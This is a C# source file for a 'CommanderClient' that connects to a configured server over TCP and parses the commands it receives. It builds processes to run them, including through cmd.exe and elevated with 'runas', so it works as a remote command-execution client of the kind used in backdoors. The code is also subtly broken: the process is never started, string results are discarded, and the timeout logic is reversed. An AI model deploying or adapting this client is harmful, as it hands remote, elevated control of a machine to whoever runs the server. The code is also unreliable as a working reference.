using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace CommanderClient
{
	class ClientListener
	{
		public static string ipAddr { get; set; }
		public static string port { get; set; }
		public static string CustomName { get; set; }
		public static Process CommandProcess;

		private static Socket ServerSocket;
		public void Run() {
			Thread th = new Thread(new ThreadStart(ClientThread));
			th.Start();
		}
		static void ClientThread() {
			//this thread will retry to connect when disconnected
			IPAddress ip = IPAddress.Parse(ClientListener.ipAddr);
			ServerSocket = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			Thread th = new Thread(new ThreadStart(ListenToServer));
			try {
				while (true) {
					Thread.Sleep(6000);		//wait for a minute for next retry
					if (!ServerSocket.Connected) {
						ServerSocket.Connect(ip, int.Parse(ClientListener.port));
						th.Start();
					}
				}
			}catch(Exception ex) { Program.logger.Log(logType.Error, ex.Message); }
		}
		public static void ListenToServer() {
			//this thread will get and read received text
			while (ServerSocket.Connected) {
				Thread.Sleep(10);
				if (Read(true, out string text))
					readInput(text);
			}
		}
		static void readInput(string Text) {        //this method reads received text
			string flags = Regex.Match(Text, @"^\<\w+\>", RegexOptions.Multiline).Value;	//get flags by regex (example)-> https://regexr.com/4obl9 recommend to use external browser.
			Text = Text.Substring(flags.Length);		//remove flags
			flags.Trim('<', '>');
			foreach(char f in flags) {
				switch (f) {
				//Flages: $:server_message, e:just_check_exit_code, a:run_as_admin, v:visible_cmd_window, n:normal, s:shell execute

				//server internall commands flag
				case '$': {
						//this line must run by internalcmd.Do
						Program.internalCmd.Do(Text);
					}
					break;

				//run command and set start info properties
				default: {
						//get filename and arguments
						string args = "";
						if (Text.Contains(" ")) {
							args = Text.Substring(Text.IndexOf(' ') + 1);
							Text = Text.Substring(0, Text.IndexOf(' '));
						}
						ProcessStartInfo stinf = new ProcessStartInfo() {
							FileName = Text,
							Arguments = args,
						};
						if (flags.Contains("v")) {
							//visible flag founded so cannot redirect input and output
							stinf.CreateNoWindow = false;
							stinf.WindowStyle = ProcessWindowStyle.Normal;
							stinf.FileName = "cmd.exe";
							stinf.Arguments = $"/c {Text} {args}";
						} else if (flags.Contains("s")) {
							//shell excute flag
							stinf.UseShellExecute = true;
						} else if(!flags.Contains("e")) {	//flags not contains "e"
							//redirect all outputs
							stinf.RedirectStandardOutput = true;
							stinf.RedirectStandardInput = true;
							stinf.RedirectStandardError = true;
							stinf.UseShellExecute = false;
						}

						if (flags.Contains("a")) stinf.Verb = "runas";

						//start process
					}
					break;
				}
			}
		}
		public static int WaitSec { get; set; }

		public static bool Read(bool Wait, out string Text) {
			Text = "";
			int count = 0;
			var t = DateTime.Now;
			while (Wait && (t - DateTime.Now) <= new TimeSpan(0, 0, WaitSec)) {
				do {
					try {
						byte[] buffer = new byte[1024];
						count = ServerSocket.Receive(buffer);
						Text += Encoding.ASCII.GetString(buffer, 0, count);
					} catch (Exception ex) { Program.logger.Log(logType.Error, $"EXCEPTION IN CLIENT/READ: {ex.Message}"); break; }
					if (Text.Contains("<$eof>"))
						break;
				} while (count != 0);
			}
			if (Text.Length != 0) {
				try { Text.Replace("<$eof>", ""); } catch { /*do nothing*/ }
			}
			//if count be zero means that something went wrong. stream ended without <$eof> or there's nothing to read.
			return count != 0;
		}
		public void Send(string Text) {
			Text += "<$eof>";
			byte[] buffer = Encoding.ASCII.GetBytes(Text);
			try {
				ServerSocket.Send(buffer);
			} catch (Exception ex) { Program.logger.Log(logType.Error, $"EXCEPTION IN SERVER/SEND: {ex.Message}"); }

		}
	}
}
